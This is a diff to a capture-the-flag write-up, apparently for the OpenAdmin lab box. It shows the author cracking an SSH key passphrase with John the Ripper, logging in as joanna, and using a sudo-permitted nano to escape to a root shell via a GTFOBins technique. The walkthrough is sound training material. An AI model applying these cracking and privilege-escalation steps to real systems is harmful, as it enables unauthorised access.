@@ -198,7 +198,7 @@ After loggin in we get presented with a id_rsa key, hopefully for the other user
 
 ![image](https://user-images.githubusercontent.com/5285547/124388861-9e332580-dcdc-11eb-8947-ad209bd45ff0.png)
 
-## Joanna
+## Joanna (User flag)
 
 Using ssh2john.py, then john the ripper, I crack the id_rsa password
 
@@ -209,6 +209,36 @@ sudo ./john -w=/usr/share/SecLists/Passwords/rockyou.txt ~/id_rsa.hash
 
 ![image](https://user-images.githubusercontent.com/5285547/124389745-75ad2a80-dce0-11eb-8d0b-4952c216765d.png)
 
+Now we can login as joanna and get the user flag
+
+```
+ssh joanna@10.10.10.171 -i id_rsa
+```
+
+Checking out what we can run as joanna, we see a nice place to start with sudo -l
+
+```
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+```
+
+## Root (Last flag)
+
+Using this information and armed with GTFOBins
+
+![image](https://user-images.githubusercontent.com/5285547/124390018-a2157680-dce1-11eb-9bfa-0c152eb1b1e0.png)
+
+Our final path to route is quite simple. 
+
+```
+sudo /bin/nano /opt/priv
+Ctrl+r,Ctrl+x
+reset; sh 1>&0 2>&0
+```
+
+We can grab the last flag and finish the box
+
+![image](https://user-images.githubusercontent.com/5285547/124390067-e6087b80-dce1-11eb-8be5-3c61de8a4c3b.png)
 
 
 
